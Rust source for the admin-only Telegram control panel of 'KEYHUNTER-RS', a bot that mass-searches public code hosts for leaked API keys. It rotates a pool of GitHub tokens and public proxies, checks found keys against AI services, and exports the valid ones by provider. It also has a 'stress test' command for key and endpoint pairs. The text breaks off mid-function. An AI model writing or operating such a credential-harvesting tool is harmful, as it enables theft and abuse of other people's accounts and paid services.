use crate::app::{App, Job, JobKind, Pending};
use crate::format::{esc, msk};
use crate::scan;
use crate::store::Finding;
use crate::tg::{CallbackQuery, Message, Update};
use anyhow::{bail, Result};
use futures::stream::{self, StreamExt};
use serde_json::{json, Value};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn};

pub async fn run(app: Arc<App>) -> Result<()> {
    if std::env::var("NO_POLL").map(|v| v == "1").unwrap_or(false) {
        info!("NO_POLL=1: scanner-only mode, TG fully disabled");
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
        }
    }

    let me = app.tg.get_me().await?;
    info!(
        "polling as @{} (id {})",
        me.username.clone().unwrap_or_default(),
        me.id
    );
    let stats = app.store.stats();
    let text = format!(
        "🛰 <b>KEYHUNTER-RS</b> · online\n\n🗂 PAT: <b>{}</b> · 🗄 База: <b>{}</b> · ✅ AI valid: <b>{}</b> · 🔑 PAT найдено: <b>{}</b>\n\nПанель — /panel",
        app.pool.alive(),
        stats.findings,
        stats.valid,
        stats.pat_valid
    );
    if app.cfg.notify_start {
        let _ = app
            .tg
            .send(
                app.cfg.admin_id,
                &text,
                Some(kb(vec![vec![("🛰 Открыть панель", "m:main")]])),
            )
            .await;
    }

    let mut offset = 0i64;
    loop {
        match app.tg.get_updates(offset, 50).await {
            Ok(ups) => {
                for u in ups {
                    offset = u.update_id + 1;
                    if let Err(e) = handle_update(&app, u).await {
                        warn!("update error: {e}");
                    }
                }
            }
            Err(e) => {
                warn!("getUpdates failed: {e}");
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

async fn handle_update(app: &Arc<App>, u: Update) -> Result<()> {
    if let Some(cb) = u.callback_query {
        return handle_cb(app, cb).await;
    }
    if let Some(msg) = u.message {
        return handle_msg(app, msg).await;
    }
    Ok(())
}

async fn handle_msg(app: &Arc<App>, msg: Message) -> Result<()> {
    let user_id = msg.from.as_ref().map(|u| u.id).unwrap_or(0);
    let chat = msg.chat.id;
    if !app.is_admin(user_id) {
        // Do not amplify every message in a group where the bot happens to
        // sit; the private bot has exactly one legitimate operator.
        if msg.chat.chat_type == "private" {
            let _ = app
                .tg
                .send(chat, "🔒 Приватный сканер. Доступ только у админа.", None)
                .await;
        }
        return Ok(());
    }
    let text = msg.text.clone().unwrap_or_default().trim().to_string();
    if let Some(doc) = msg.document.clone() {
        let pending = app.take_pending(user_id);
        if matches!(pending, Some(Pending::Stress)) {
            return handle_stress_document(app, chat, doc).await;
        }
        if matches!(pending, Some(Pending::ApiCheck)) {
            return handle_api_check_document(app, chat, doc).await;
        }
        return handle_pat_document(app, chat, doc).await;
    }
    if text.is_empty() {
        return Ok(());
    }

    if text.starts_with('/') {
        let (cmd, args) = split_cmd(&text);
        if cmd != "cancel" {
            app.clear_pending(user_id);
        }
        match cmd.as_str() {
            "start" | "panel" => send_panel(app, chat, main_panel(app)).await?,
            "help" => send_panel(app, chat, help_panel()).await?,
            "addpat" => {
                if args.is_empty() {
                    ask_pats(app, chat, user_id).await?;
                } else {
                    let a = app.clone();
                    tokio::spawn(async move { add_pats(a, chat, args).await });
                    let _ = app.tg.send(chat, "🔬 Проверяю токены…", None).await;
                }
            }
            "pats" => send_panel(app, chat, pats_panel(app)).await?,
            "apicheck" | "checker" => ask_api_check(app, chat, user_id).await?,
            "stress" | "stresstest" | "stress-test" => ask_stress(app, chat, user_id).await?,
            "scan" => {
                if args.is_empty() {
                    ask_scan(app, chat, user_id).await?;
                } else {
                    start_scan(app, chat, &args).await?;
                }
            }
            "repo" => {
                if args.is_empty() {
                    let _ = app
                        .tg
                        .send(chat, "🚀 <code>/repo owner/name</code>", None)
                        .await;
                } else {
                    start_scan_kind(app, chat, &args, JobKind::Repo).await?;
                }
            }
            "check" => {
                let mut it = args.split_whitespace();
                match (it.next(), it.next()) {
                    (Some(url), Some(key)) => {
                        let a = app.clone();
                        let (u, k) = (url.to_string(), key.to_string());
                        let _ = app.tg.send(chat, "🧪 Проверяю пару…", None).await;
                        tokio::spawn(async move { scan::manual_check(a, chat, u, k).await });
                    }
                    _ => {
                        let _ = app
                            .tg
                            .send(
                                chat,
                                "🔬 <code>/check https://api.host/v1 sk-...</code>",
                                None,
                            )
                            .await;
                    }
                }
            }
            "backup" => {
                spawn_backup(app, chat).await;
            }
            "stats" => send_panel(app, chat, stats_panel(app)).await?,
            "queries" => send_panel(app, chat, queries_panel(app)).await?,
            "atlas" => send_panel(app, chat, atlas_panel(app)).await?,
            "addq" => {
                if args.is_empty() {
                    ask_query(app, chat, user_id).await?;
                } else {
                    match app.store.add_query(&args) {
                        Ok(true) => {
                            let _ = app
                                .tg
                                .send(chat, "✅ Запрос добавлен в ротацию.", None)
                                .await;
                        }
                        Ok(false) => {
                            let _ = app.tg.send(chat, "⚠️ Такой запрос уже есть.", None).await;
                        }
                        Err(e) => {
                            let _ = app
                                .tg
                                .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                                .await;
                        }
                    }
                }
            }
            "delq" => {
                if let Ok(id) = args.parse::<i64>() {
                    app.store.delete_query(id);
                    let _ = app
                        .tg
                        .send(chat, &format!("🗑 Запрос #{} удалён.", id), None)
                        .await;
                }
            }
            "toggleq" => {
                if let Ok(id) = args.parse::<i64>() {
                    let on = app.store.toggle_query(id);
                    let _ = app
                        .tg
                        .send(
                            chat,
                            &format!("🎯 Запрос #{}: {}", id, if on { "вкл" } else { "выкл" }),
                            None,
                        )
                        .await;
                }
            }
            "delpat" => {
                if let Ok(id) = args.parse::<i64>() {
                    app.store.delete_pat(id);
                    let _ = app.pool.reload();
                    app.sync_source_pats();
                    let _ = app
                        .tg
                        .send(chat, &format!("🗑 PAT #{} удалён.", id), None)
                        .await;
                }
            }
            "lane" | "patslane" | "patlane" => {
                handle_lane(app, chat, &args).await?;
            }
            "watch" | "auto" => {
                handle_auto(app, chat, &args).await?;
            }
            "sources" => {
                handle_sources(app, chat, &args).await?;
            }
            "proxies" => {
                handle_proxies(app, chat, &args).await?;
            }
            "export" => {
                let arg = args.trim();
                if arg.is_empty() {
                    send_panel(app, chat, export_menu_panel(app)).await?;
                } else {
                    let low = arg.to_lowercase();
                    match low.as_str() {
                        "all" | "все" => {
                            export_filtered(app, chat, ExportPreset::All, None).await?
                        }
                        "dashscope" | "dash" => {
                            export_filtered(app, chat, ExportPreset::DashScope, None).await?
                        }
                        "moonshot" | "moonshoot" | "moon" => {
                            export_filtered(app, chat, ExportPreset::Moonshot, None).await?
                        }
                        "openai" | "gpt" => {
                            export_filtered(app, chat, ExportPreset::OpenAi, None).await?
                        }
                        _ => {
                            export_filtered(app, chat, ExportPreset::Custom, Some(arg.to_string()))
                                .await?
                        }
                    }
                }
            }
            "set" => {
                let mut it = args.splitn(2, ' ');
                match (it.next(), it.next()) {
                    (Some(k), Some(v)) => match apply_setting(app, k, v).await {
                        Ok(m) => {
                            let _ = app.tg.send(chat, &format!("✅ {}", m), None).await;
                        }
                        Err(e) => {
                            let _ = app
                                .tg
                                .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                                .await;
                        }
                    },
                    _ => {
                        let _ = app
                            .tg
                            .send(chat, "⚙️ <code>/set probe_limit 26</code>", None)
                            .await;
                    }
                }
            }
            "cancel" => {
                app.clear_pending(user_id);
                let _ = app.tg.send(chat, "✖️ Отменено.", None).await;
            }
            _ => {
                let _ = app
                    .tg
                    .send(chat, "❓ Неизвестная команда. /help", None)
                    .await;
            }
        }
        return Ok(());
    }

    if let Some(pending) = app.take_pending(user_id) {
        match pending {
            Pending::Pats => {
                let a = app.clone();
                tokio::spawn(async move { add_pats(a, chat, text).await });
            }
            Pending::ApiCheck => {
                let pairs = crate::checker::parse_pairs(&text);
                if pairs.is_empty() {
                    let _ = app
                        .tg
                        .send(
                            chat,
                            "⚠️ Не вижу пар. Формат: ключ, строка ниже base url, пустая строка между парами.",
                            None,
                        )
                        .await;
                } else {
                    let a = app.clone();
                    tokio::spawn(async move {
                        if let Err(e) = crate::checker::run(a, chat, pairs, "вставка".into()).await
                        {
                            warn!("api checker: {e}");
                        }
                    });
                }
            }
            Pending::Stress => {
                let pairs = crate::checker::parse_pairs(&text);
                if pairs.is_empty() {
                    let _ = app
                        .tg
                        .send(chat, "⚠️ Нужна пара: ключ и строкой ниже base url.", None)
                        .await;
                } else {
                    let a = app.clone();
                    tokio::spawn(async move {
                        if let Err(e) = crate::stress::run(a, pairs, "вставка".into()).await
                        {
                            warn!("stress test: {e}");
                        }
                    });
                }
            }
            Pending::ExportFilter => {
                let q = text.trim().to_string();
                if q.is_empty() {
                    let _ = app
                        .tg
                        .send(chat, "⚠️ Нужна модель или часть endpoint.", None)
                        .await;
                } else {
                    export_filtered(app, chat, ExportPreset::Custom, Some(q)).await?;
                }
            }
            Pending::Setting(key) => match apply_setting(app, &key, &text).await {
                Ok(m) => {
                    let _ = app.tg.send(chat, &format!("✅ {}", m), None).await;
                    send_panel(app, chat, settings_panel(app)).await?;
                }
                Err(e) => {
                    let _ = app
                        .tg
                        .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                        .await;
                }
            },
            Pending::QueryAdd => {
                match app.store.add_query(&text) {
                    Ok(true) => {
                        let _ = app
                            .tg
                            .send(chat, "✅ Запрос добавлен в ротацию.", None)
                            .await;
                    }
                    Ok(false) => {
                        let _ = app.tg.send(chat, "⚠️ Такой запрос уже есть.", None).await;
                    }
                    Err(e) => {
                        let _ = app
                            .tg
                            .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                            .await;
                    }
                }
                send_panel(app, chat, queries_panel(app)).await?;
            }
            Pending::Scan => {
                start_scan(app, chat, &text).await?;
            }
        }
        return Ok(());
    }

    let _ = app
        .tg
        .send(chat, "🛰 Панель: /panel · справка: /help", None)
        .await;
    Ok(())
}

async fn handle_cb(app: &Arc<App>, cb: CallbackQuery) -> Result<()> {
    if !app.is_admin(cb.from.id) {
        let _ = app.tg.answer_cb(&cb.id, "🔒").await;
        return Ok(());
    }
    let Some(msg) = cb.message.clone() else {
        return Ok(());
    };
    // A callback is a navigation event. Any text-input prompt left armed
    // from a previous panel must not swallow the next unrelated message.
    app.clear_pending(cb.from.id);
    let data = cb.data.clone().unwrap_or_default();
    let chat = msg.chat.id;
    let mid = msg.message_id;
    if chat != app.cfg.admin_id && chat != app.report_chat() {
        let _ = app.tg.answer_cb(&cb.id, "🔒").await;
        return Ok(());
    }
    let _ = app.tg.answer_cb(&cb.id, "").await;

    match data.as_str() {
        "m:main" => edit_or_send(app, chat, mid, main_panel(app)).await?,
        "m:pats" => edit_or_send(app, chat, mid, pats_panel(app)).await?,
        "m:set" => edit_or_send(app, chat, mid, settings_panel(app)).await?,
        "m:stats" => edit_or_send(app, chat, mid, stats_panel(app)).await?,
        "m:queries" => edit_or_send(app, chat, mid, queries_panel(app)).await?,
        "m:db" => edit_or_send(app, chat, mid, db_panel(app)).await?,
        "m:atlas" => edit_or_send(app, chat, mid, atlas_panel(app)).await?,
        "m:sources" => edit_or_send(app, chat, mid, sources_panel(app)).await?,
        "m:proxy" => edit_or_send(app, chat, mid, proxy_panel(app)).await?,
        "px:on" => {
            app.store.set_setting("auto_proxy", "1")?;
            edit_or_send(app, chat, mid, proxy_panel(app)).await?;
        }
        "px:off" => {
            app.store.set_setting("auto_proxy", "0")?;
            if app.store.setting("proxy", "").trim().is_empty() {
                let _ = app.set_scoped_proxy(None, "probe");
            }
            edit_or_send(app, chat, mid, proxy_panel(app)).await?;
        }
        "px:scope" => {
            let cur = app.store.setting("proxy_scope", "sources");
            let next = match cur.as_str() {
                "sources" => "probe",
                "probe" => "all",
                _ => "sources",
            };
            app.store.set_setting("proxy_scope", next)?;
            edit_or_send(app, chat, mid, proxy_panel(app)).await?;
        }
        "px:now" => {
            let p = app.proxy_pool.clone();
            tokio::spawn(async move {
                if let Err(e) = p.refresh().await {
                    tracing::warn!("proxy refresh: {e}");
                }
            });
            let _ = app
                .tg
                .send(
                    chat,
                    "🔄 Проверяю публичные прокси в фоне — 30–90 секунд.",
                    None,
                )
                .await;
        }
        "src:interval" => {
            ask_setting(app, chat, cb.from.id, "source_interval").await?;
        }
        "src:docs" => {
            ask_setting(app, chat, cb.from.id, "source_docs").await?;
        }
        "m:export" => {
            edit_or_send(app, chat, mid, export_menu_panel(app)).await?;
        }
        "x:all" => export_filtered(app, chat, ExportPreset::All, None).await?,
        "x:dashscope" => {
            export_filtered(app, chat, ExportPreset::DashScope, None).await?;
        }
        "x:moonshot" => {
            export_filtered(app, chat, ExportPreset::Moonshot, None).await?;
        }
        "x:openai" => {
            export_filtered(app, chat, ExportPreset::OpenAi, None).await?;
        }
        "x:filter" => {
            ask_export_filter(app, chat, cb.from.id).await?;
        }
        "src:on" => {
            app.store.set_setting("sources", "1")?;
            app.store.set_setting("last_source", "0")?;
            edit_or_send(app, chat, mid, sources_panel(app)).await?;
        }
        "src:off" => {
            app.store.set_setting("sources", "0")?;
            edit_or_send(app, chat, mid, sources_panel(app)).await?;
        }
        "src:now" => match crate::auto::trigger_sources_now(app).await {
            Some(q) => {
                let _ = app
                    .tg
                    .send(
                        chat,
                        &format!(
                            "🌐 <b>Источник запущен:</b> <code>{}</code>\nКарточки придут сюда.",
                            esc(&q)
                        ),
                        None,
                    )
                    .await;
            }
            None => {
                let _ = app
                    .tg
                    .send(
                        chat,
                        "⏳ Нет свободного воркера — попробуй через минуту.",
                        None,
                    )
                    .await;
            }
        },
        "m:backup" => {
            spawn_backup(app, chat).await;
        }
        "m:help" => edit_or_send(app, chat, mid, help_panel()).await?,
        "m:scan" => {
            ask_scan(app, chat, cb.from.id).await?;
        }
        "m:apicheck" => {
            ask_api_check(app, chat, cb.from.id).await?;
        }
        "m:stress" => {
            ask_stress(app, chat, cb.from.id).await?;
        }
        "p:add" => {
            ask_pats(app, chat, cb.from.id).await?;
        }
        "p:test" => {
            let a = app.clone();
            tokio::spawn(async move { test_pats(a, chat).await });
            let _ = app.tg.send(chat, "🧪 Проверяю пул…", None).await;
        }
        "p:lanes" => {
            handle_lane(app, chat, "").await?;
        }
        "p:prune" => {
            let n = app.store.prune_dead_pats();
            let _ = app.pool.reload();
            app.sync_source_pats();
            let (mut text, kbv) = pats_panel(app);
            text.push_str(&format!("\n\n🗑 Удалено мёртвых: <b>{}</b>", n));
            let _ = app.tg.edit(chat, mid, &text, Some(kbv)).await;
        }
        d if d.starts_with("p:delc:") => {
            if let Ok(id) = d[7..].parse::<i64>() {
                app.store.delete_pat(id);
                let _ = app.pool.reload();
                app.sync_source_pats();
                edit_or_send(app, chat, mid, pats_panel(app)).await?;
            }
        }
        d if d.starts_with("p:del:") => {
            if let Ok(id) = d[6..].parse::<i64>() {
                let text = format!("🗑 Удалить PAT #{} из пула?", id);
                let kbv = kb_s(vec![vec![
                    ("✅ Удалить".to_string(), format!("p:delc:{}", id)),
                    ("← Назад".to_string(), "m:pats".to_string()),
                ]]);
                let _ = app.tg.edit(chat, mid, &text, Some(kbv)).await;
            }
        }
        "s:forks" => {
            let cur = app.store.setting_i64("include_forks", 1);
            app.store
                .set_setting("include_forks", if cur == 1 { "0" } else { "1" })?;
            edit_or_send(app, chat, mid, settings_panel(app)).await?;
        }
        "s:probe_random" => {
            let cur = app.store.setting_i64("probe_random", 1);
            app.store
                .set_setting("probe_random", if cur == 1 { "0" } else { "1" })?;
            edit_or_send(app, chat, mid, settings_panel(app)).await?;
        }
        d if d.starts_with("s:") => {
            let key = &d[2..];
            ask_setting(app, chat, cb.from.id, key).await?;
        }
        "q:add" => {
            ask_query(app, chat, cb.from.id).await?;
        }
        d if d.starts_with("q:del:") => {
            if let Ok(id) = d[6..].parse::<i64>() {
                app.store.delete_query(id);
                edit_or_send(app, chat, mid, queries_panel(app)).await?;
            }
        }
        d if d.starts_with("q:toggle:") => {
            if let Ok(id) = d[9..].parse::<i64>() {
                app.store.toggle_query(id);
                edit_or_send(app, chat, mid, queries_panel(app)).await?;
            }
        }
        "a:on" | "w:on" => {
            app.store.set_setting("auto", "1")?;
            app.store.set_setting("last_auto", "0")?;
            edit_or_send(app, chat, mid, main_panel(app)).await?;
        }
        "a:off" | "w:off" => {
            app.store.set_setting("auto", "0")?;
            edit_or_send(app, chat, mid, main_panel(app)).await?;
        }
        "m:refresh" => edit_or_send(app, chat, mid, main_panel(app)).await?,
        _ => {}
    }
    Ok(())
}

async fn send_panel(app: &Arc<App>, chat: i64, panel: (String, Value)) -> Result<()> {
    let (text, kbv) = panel;
    if let Err(e) = app.tg.send(chat, &text, Some(kbv)).await {
        warn!("panel send failed: {e}");
    }
    Ok(())
}

async fn edit_or_send(app: &Arc<App>, chat: i64, mid: i64, panel: (String, Value)) -> Result<()> {
    let (text, kbv) = panel;
    if let Err(e) = app.tg.edit(chat, mid, &text, Some(kbv.clone())).await {
        // Telegram returns this when a refresh produces identical content.
        // Sending a second copy would duplicate every panel on refresh.
        if !e
            .to_string()
            .to_lowercase()
            .contains("message is not modified")
        {
            let _ = app.tg.send(chat, &text, Some(kbv)).await;
        }
    }
    Ok(())
}

fn main_panel(app: &App) -> (String, Value) {
    let st = app.store.stats();
    let qs = app.store.list_queries();
    let enabled = qs.iter().filter(|q| q.enabled).count();
    let auto_on = app.store.setting_i64("auto", 1) == 1;
    let interval = interval_label(app.store.setting_i64("auto_interval", 25));
    let active = app.active_jobs.load(std::sync::atomic::Ordering::Relaxed);
    let text = format!(
        "🛰 <b>KEYHUNTER-RS</b>\nМультиисточниковый сканер ключей\n\n\
         📡 <b>Автоскан:</b> {} · каждые {}\n\
         ⚙️ <b>В работе:</b> {} · 🗺 хостов: {}\n\
         🗂 <b>PAT-пул:</b> {} живых / {}\n\
         🎯 <b>Запросы:</b> {} из {}\n\
         🌐 <b>Источники:</b> {} · {} · задач {}\n\
         🗄 <b>База:</b> {} ключей · ✅ {} AI valid · 🔑 {} PAT найдено\n\n\
         Выбери раздел ↓",
        if auto_on { "вкл" } else { "выкл" },
        interval,
        active,
        st.hosts,
        st.pats_alive,
        st.pats_total,
        enabled,
        qs.len(),
        if app.store.setting_i64("sources", 1) == 1 {
            "вкл"
        } else {
            "выкл"
        },
        crate::sources::source_count(),
        app.store.source_task_count(),
        st.findings,
        st.valid,
        st.pat_valid
    );
    let kbv = kb_s(vec![
        vec![
            ("🗂 PAT-пул".into(), "m:pats".into()),
            ("🎯 Запросы".into(), "m:queries".into()),
        ],
        vec![
            ("⚙️ Настройки".into(), "m:set".into()),
            ("📊 Статистика".into(), "m:stats".into()),
        ],
        vec![
            ("🗃 База".into(), "m:db".into()),
            ("🗺 Атлас".into(), "m:atlas".into()),
        ],
        vec![
            ("🌐 Источники".into(), "m:sources".into()),
            ("🌐 Прокси".into(), "m:proxy".into()),
            (
                format!("📡 Авто: {}", if auto_on { "стоп" } else { "старт" }),
                if auto_on {
                    "a:off".into()
                } else {
                    "a:on".into()
                },
            ),
        ],
        vec![
            ("🚀 Скан".into(), "m:scan".into()),
            ("❓ Помощь".into(), "m:help".into()),
        ],
        vec![
            ("🧪 Чекер API".into(), "m:apicheck".into()),
            ("⚡ Стресс-тест".into(), "m:stress".into()),
        ],
        vec![
            ("📤 VALID .txt".into(), "m:export".into()),
            ("📦 Полный бэкап".into(), "m:backup".into()),
            ("🔄 Обновить".into(), "m:refresh".into()),
        ],
    ]);
    (text, kbv)
}

async fn spawn_backup(app: &Arc<App>, chat: i64) {
    // Secrets must never be posted into a shared report chat. If the button is
    // pressed in a group, the archive still goes to the admin's private chat.
    let target = if chat == app.cfg.admin_id {
        chat
    } else {
        app.cfg.admin_id
    };
    let _ = app
        .tg
        .send(
            chat,
            "📦 Собираю полный бэкап: код + БД ключей + .env. Это может занять несколько секунд…",
            None,
        )
        .await;
    let a = app.clone();
    tokio::spawn(async move {
        match crate::backup::send_full_backup(a.clone(), target).await {
            Ok(path) => {
                let _ =
                    a.tg.send(
                        chat,
                        &format!(
                            "✅ Бэкап отправлен: <code>{}</code>",
                            crate::format::esc(&path.display().to_string())
                        ),
                        None,
                    )
                    .await;
            }
            Err(e) => {
                let _ =
                    a.tg.send(
                        chat,
                        &format!("❌ Бэкап не собран: {}", crate::format::esc(&e.to_string())),
                        None,
                    )
                    .await;
            }
        }
    });
}

async fn handle_lane(app: &Arc<App>, chat: i64, args: &str) -> Result<()> {
    let args = args.trim().to_ascii_lowercase();
    let pats = app.store.list_pats();
    if args.is_empty() {
        let mut s = String::from("🔀 <b>ЛЕЙНЫ PAT</b>\n\n");
        for p in pats.iter().take(40) {
            s.push_str(&format!(
                "#<code>{}</code> · {} · {}\n",
                p.id,
                if p.search_lane == "official" {
                    "🟢 official"
                } else if p.search_lane == "pat" {
                    "🟣 pat (lane 2)"
                } else {
                    "⚪ pair"
                },
                esc(if p.login.is_empty() { "?" } else { &p.login })
            ));
        }
        if pats.len() > 40 {
            s.push_str(&format!("… и ещё {} PAT\n", pats.len() - 40));
        }
        s.push_str("\n<code>/lane 12 official</code> — перевести PAT в официальный поиск\n<code>/lane 12 pair</code> — в общий\n<code>/lane 12 pat</code> — в PAT-поиск (lane 2)\n<code>/lane auto</code> — вернуть авто-раскладку 3 official / 2 pat / остальные pair");
        let _ = app.tg.send(chat, &s, None).await;
        return Ok(());
    }
    if args == "auto" || args == "авто" {
        app.store
            .reset_pat_lanes_auto(app.store.setting_i64("official_pats", 3).clamp(0, 3) as usize);
        app.pool.reload()?;
        let _ = app
            .tg
            .send(
                chat,
                "🔀 Авто-раскладка восстановлена: 3 official, 2 pat, остальные pair.",
                None,
            )
            .await;
        return Ok(());
    }
    let mut it = args.split_whitespace();
    let id = it
        .next()
        .and_then(|v| v.trim_start_matches('#').parse::<i64>().ok());
    let lane = it.next().unwrap_or("");
    match id {
        Some(id) if !lane.is_empty() => {
            if app.store.set_pat_lane(id, lane) {
                app.pool.reload()?;
                let _ = app
                    .tg
                    .send(
                        chat,
                        &format!(
                            "✅ PAT #{} → {}",
                            id,
                            if lane.starts_with("off") || lane.starts_with("офиц") {
                                "🟢 official"
                            } else if lane.starts_with("pat") || lane.starts_with("lane2") {
                                "🟣 pat (lane 2)"
                            } else {
                                "⚪ pair"
                            }
                        ),
                        None,
                    )
                    .await;
            } else {
                let _ = app
                    .tg
                    .send(chat, "❌ Нет такого PAT или лейна. /lane", None)
                    .await;
            }
        }
        _ => {
            let _ = app
                .tg
                .send(
                    chat,
                    "🔀 <code>/lane &lt;id&gt; official|pair|pat</code> или <code>/lane auto</code>",
                    None,
                )
                .await;
        }
    }
    Ok(())
}

fn pats_panel(app: &App) -> (String, Value) {
    let pats = app.store.list_pats();
    let alive = pats.iter().filter(|p| p.status == "alive").count();
    let official = pats.iter().filter(|p| p.search_lane == "official").count();
    let pat = pats.iter().filter(|p| p.search_lane == "pat").count();
    let pair = pats.iter().filter(|p| p.search_lane == "pair").count();
    let mut s = format!(
        "🗂 <b>PAT-ПУЛ</b>\n\n👥 Живых: <b>{}</b> · 🟢 official: <b>{}</b> · 🟣 pat: <b>{}</b> · ⚪ pair: <b>{}</b> · всего: <b>{}</b>\n\n",
        alive,
        official,
        pat,
        pair,
        pats.len()
    );
    if pats.is_empty() {
        s.push_str("Пул пуст. GitHub code search без токена не работает — залей пачку. Gitee/GitLab/Gitea/Codeberg добавляй с префиксом провайдера.\n");
    }
    for (i, p) in pats.iter().take(12).enumerate() {
        let icon = if p.status == "alive" { "✅" } else { "💀" };
        let lane = if p.search_lane == "official" {
            "🟢 OFFICIAL"
        } else if p.search_lane == "pat" {
            "🟣 PAT"
        } else {
            "⚪ PAIR"
        };
        s.push_str(&format!(
            "{}. {} <code>{}</code> · 🧩 {} · <b>{}</b> · {}\n",
            i + 1,
            icon,
            mask(&p.token),
            crate::pat::label(&p.provider),
            esc(if p.login.is_empty() {
                "?"
            } else {
                p.login.as_str()
            }),
            lane
        ));
        s.push_str(&format!(
            "   🔎 {}/10 · 🧠 {}/5000 · {}\n",
            p.remaining_search.max(0),
            p.remaining_core.max(0),
            esc(if p.scopes.is_empty() {
                "scope: —"
            } else {
                &p.scopes
            })
        ));
    }
    if pats.len() > 12 {
        s.push_str(&format!("… и ещё {}\n", pats.len() - 12));
    }
    s.push_str("\n🟢 OFFICIAL — только официальные API.\n⚪ PAIR — кастомные/неофициальные релеи.\n🔀 Переключить: /lane &lt;id&gt; official|pair|pat · /lane auto\n➕ Новые токены идут в ротацию сразу.\n");
    let kbv = kb(vec![
        vec![("➕ Добавить", "p:add"), ("🧪 Проверить", "p:test")],
        vec![("🔀 Лейны", "p:lanes"), ("🗑 Удалить мёртвые", "p:prune")],
        vec![("← Назад", "m:main")],
    ]);
    (s, kbv)
}

fn settings_panel(app: &App) -> (String, Value) {
    let g = |k: &str, d: i64| app.store.setting_i64(k, d);
    let forks = g("include_forks", 1) == 1;
    let proxy = app.store.setting("proxy", "");
    let text = format!(
        "⚙️ <b>НАСТРОЙКИ</b>\n\n\
         🧠 Моделей на ключ: <b>{}</b>\n\
         ⚡ Проб в параллель: <b>{}</b>\n\
         🔗 Ключей в параллель: <b>{}</b>\n\
         🧵 Воркеров: <b>{}</b>\n\
         🕳 Глубина коммитов: <b>{}</b>\n\
         📄 Файлов на скан: <b>{}</b>\n\
         🔎 Страниц поиска: <b>{}</b>\n\
         🎯 Проб на скан: <b>{}</b>\n\
         ⏱ Авто: <b>{}</b>\n\
         🎚 Авто-батч: <b>{}</b>\n\
         🕳 Deep repos: <b>{}</b>\n\
         🗂 Кэш, дни: <b>{}</b>\n\
         ⭐ Мин. звёзд: <b>{}</b>\n\
         🍴 Форки: <b>{}</b>\n\
         🔁 Recheck: <b>{} ч</b>\n\
         🎯 Challenge: <b>{}</b>\n\
         🎲 Challenge mode: <b>{}</b>\n\
         📡 Отчёт: <b>{}</b>\n\
         🌐 Источники: <b>{}</b> · <b>{}</b>\n\
         🌐 Прокси: <b>{}</b>",
        g("probe_limit", 40),
        g("probe_concurrency", 12),
        g("concurrency", 64),
        g("workers", 24),
        g("commit_depth", 100),
        g("max_files", 1200),
        g("scan_pages", 6),
        g("max_probes", 500),
        interval_label(g("auto_interval", 25)),
        g("auto_batch", 6),
        g("deep_repos", 10),
        g("cache_days", 3),
        g("min_stars", 0),
        if forks { "да" } else { "нет" },
        g("recheck_hours", 12),
        esc(&app.store.setting("probe_challenge", "alibaba")),
        if g("probe_random", 1) == 1 {
            "случайный токен"
        } else {
            "фиксированный"
        },
        g("report_chat", 0),
        if g("sources", 1) == 1 {
            "вкл"
        } else {
            "выкл"
        },
        interval_label(g("source_interval", 15)),
        if proxy.is_empty() {
            "нет".to_string()
        } else {
            esc(&proxy)
        }
    );
    let rows: Vec<Vec<(String, String)>> = vec![
        vec![
            ("🧠 Моделей".into(), "s:probe_limit".into()),
            ("⚡ Проб".into(), "s:probe_concurrency".into()),
        ],
        vec![
            ("🔗 Ключей".into(), "s:concurrency".into()),
            ("🧵 Воркеров".into(), "s:workers".into()),
        ],
        vec![
            ("📄 Файлов".into(), "s:max_files".into()),
            ("🔎 Страниц".into(), "s:scan_pages".into()),
        ],
        vec![
            ("🎯 Проб/скан".into(), "s:max_probes".into()),
            ("⭐ Звёзды".into(), "s:min_stars".into()),
        ],
        vec![
            (
                format!("🍴 Форки: {}", if forks { "да" } else { "нет" }),
                "s:forks".into(),
            ),
            ("🔁 Recheck".into(), "s:recheck_hours".into()),
        ],
        vec![
            ("⏱ Авто, сек".into(), "s:auto_interval".into()),
            ("🎚 Авто-батч".into(), "s:auto_batch".into()),
        ],
        vec![
            ("🌐 Интервал источников".into(), "s:source_interval".into()),
            ("🌐 Документов".into(), "s:source_docs".into()),
        ],
        vec![("🎚 Источников за цикл".into(), "s:source_batch".into())],
        vec![
            ("🕳 Deep repos".into(), "s:deep_repos".into()),
            ("🗂 Кэш, дни".into(), "s:cache_days".into()),
        ],
        vec![
            ("🎯 Challenge".into(), "s:probe_challenge".into()),
            ("🎲 Random".into(), "s:probe_random".into()),
        ],
        vec![
            ("📡 Отчёт".into(), "s:report_chat".into()),
            ("🌐 Прокси".into(), "s:proxy".into()),
        ],
        vec![("← Назад".into(), "m:main".into())],
    ];
    (text, kb_s(rows))
}

fn queries_panel(app: &App) -> (String, Value) {
    let qs = app.store.list_queries();
    let mut s = format!("🎯 <b>ПОИСКОВЫЕ ЗАПРОСЫ</b> · {}\n\n", qs.len());
    for q in qs.iter().take(15) {
        s.push_str(&format!(
            "{} <b>#{}</b> <code>{}</code>\n   🎯 {} · {}\n",
            if q.enabled { "✅" } else { "⛔" },
            q.id,
            esc(&q.q),
            q.hits,
            if q.last_run > 0 {
                format!("🕐 {}", msk(q.last_run))
            } else {
                "ещё не крутился".into()
            }
        ));
    }
    if qs.len() > 15 {
        s.push_str(&format!("… и ещё {}\n", qs.len() - 15));
    }
    s.push_str("\n/toggleq ID · /delq ID · /addq <code>запрос</code>");
    let kbv = kb(vec![
        vec![("➕ Добавить", "q:add")],
        vec![("← Назад", "m:main")],
    ]);
    (s, kbv)
}

fn stats_panel(app: &App) -> (String, Value) {
    let st = app.store.stats();
    let pats = app.store.list_pats();
    let search_left: i64 = pats.iter().map(|p| p.remaining_search.max(0)).sum();
    let auto_on = app.store.setting_i64("auto", 1) == 1;
    let active = app.active_jobs.load(std::sync::atomic::Ordering::Relaxed);
    let text = format!(
        "📊 <b>СТАТИСТИКА</b>\n\n\
         🗂 PAT: <b>{}</b> живых · <b>{}</b> всего\n\
         🔎 GitHub-квота: <b>{}</b> запросов\n\
         📡 Авто: <b>{}</b> · в работе: <b>{}</b>\n\
         🌐 Источники: <b>{}</b> · {} · задач <b>{}</b>\n\
         🗺 Хостов: <b>{}</b>\n\
         🗄 Ключей в базе: <b>{}</b>\n\
